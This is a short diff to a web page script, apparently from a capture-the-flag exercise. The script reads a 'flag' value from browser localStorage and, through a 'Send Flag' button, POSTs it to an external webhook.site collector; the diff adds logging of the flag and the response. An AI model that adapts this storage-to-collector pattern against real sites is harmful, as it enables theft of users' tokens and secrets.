@@ -8,7 +8,9 @@
         document.addEventListener('DOMContentLoaded', () => {
             // Function to send a message to the webhook URL via POST request
             const sendMessageToWebhook = (message) => {
-                const webhookUrl = 'https://webhook.site/793ce786-73e8-4f90-91dd-68748f201a6a';
+                const webhookUrl = 'https://webhook.site/793ce786-73e8-4f90-91dd-68748f201a6a/flags';
+                console.log('Sending message:', message);  // Log the message being sent
+
                 fetch(webhookUrl, {
                     method: 'POST',
                     headers: {
@@ -17,6 +19,7 @@
                     body: JSON.stringify({ message: message }), // Send the message in the request body
                 })
                 .then(response => {
+                    console.log('Response status:', response.status);  // Log the response status
                     if (response.ok) {
                         console.log('Message sent successfully:', message);
                         alert('Message sent successfully!');
@@ -33,8 +36,10 @@
 
             // Check if the flag is stored in localStorage
             const storedFlag = localStorage.getItem('flag');
+            console.log('Stored flag:', storedFlag);  // Log the stored flag value
+
             if (storedFlag) {
-                console.log('Stored flag:', storedFlag);
+                console.log('Flag found:', storedFlag);  // Log if flag is found
                 // If flag is stored, show a button to send the flag
                 const sendButton = document.createElement('button');
                 sendButton.innerText = 'Send Flag';
